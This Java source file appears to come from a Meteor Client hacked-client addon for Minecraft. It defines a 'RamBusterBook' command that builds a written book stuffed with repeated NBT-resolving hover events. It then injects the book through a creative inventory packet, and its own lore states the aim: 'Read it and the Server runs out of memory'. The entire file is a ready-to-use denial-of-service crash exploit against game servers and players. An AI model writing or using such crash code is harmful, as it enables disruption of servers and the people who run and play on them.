package net.shadow.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class RamBusterBookCommand extends Command {
    public RamBusterBookCommand() {
        super("RamBusterBook", "beeg book crash", "rambook");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            final String playername = mc.player.getDisplayName().toString();
            NbtCompound nbtCompound = StringNbtReader.parse("{display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Read it and the\"}],\"text\":\"\"}','{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Server runs out of memory\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"dark_gray\",\"text\":\"Rambuster Book\"}],\"text\":\"\"}'},title:\"\",author:\"\",pages:['{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}']}");
            crash.setNbt(nbtCompound);
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(25, crash));
            info("added book");
            return SINGLE_SUCCESS;
        });
    }
}
